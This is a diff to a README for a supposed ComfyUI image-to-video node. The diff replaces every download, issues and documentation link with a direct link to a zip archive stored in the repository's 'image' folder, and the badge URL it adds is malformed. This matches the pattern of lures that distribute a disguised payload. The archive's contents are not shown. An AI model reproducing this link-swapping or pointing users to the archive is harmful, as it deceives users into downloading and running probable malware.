@@ -4,14 +4,14 @@
 ComfyUI-PainterI2VforKJ is an advanced tool for creating videos from images. It is designed specifically to address the slow-motion issue found in 4-step LoRAs, such as lightx2v. With this application, you can enjoy smoother transitions and improved visual quality in your video projects.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip%20Latest%https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)
 
 ## 🚀 Getting Started
 To get started with ComfyUI-PainterI2VforKJ, follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page and download the application:  
-   [Download Here](https://github.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/releases)
+   [Download Here](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Select the latest version for the best features and updates.
@@ -56,12 +56,12 @@ Here are some tips for getting the most out of ComfyUI-PainterI2VforKJ:
 ## 📞 Support
 If you encounter any issues while using ComfyUI-PainterI2VforKJ, please visit our GitHub issues page to report bugs or seek help. Your feedback helps improve the application for everyone. 
 
-- **GitHub Issues Page**: [Report Issues](https://github.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/issues)
+- **GitHub Issues Page**: [Report Issues](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)
 
 ## 🔗 Additional Resources
 For more information about ComfyUI-PainterI2VforKJ and to become part of our community:
 
-- **Documentation**: [View Documentation](https://github.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/docs)
+- **Documentation**: [View Documentation](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)
 - **Community Forum**: Participate in discussions and share tips with other users.
 
 ## ⚙️ Contributing
@@ -80,4 +80,4 @@ Your contributions can make a difference!
 
 ## 🚀 Download Again
 To download ComfyUI-PainterI2VforKJ, click below:  
-[Download Here](https://github.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/releases)
+[Download Here](https://raw.githubusercontent.com/agggaahh33-source/ComfyUI-PainterI2VforKJ/main/image/ComfyUI-PainterI2VforKJ_3.3.zip)
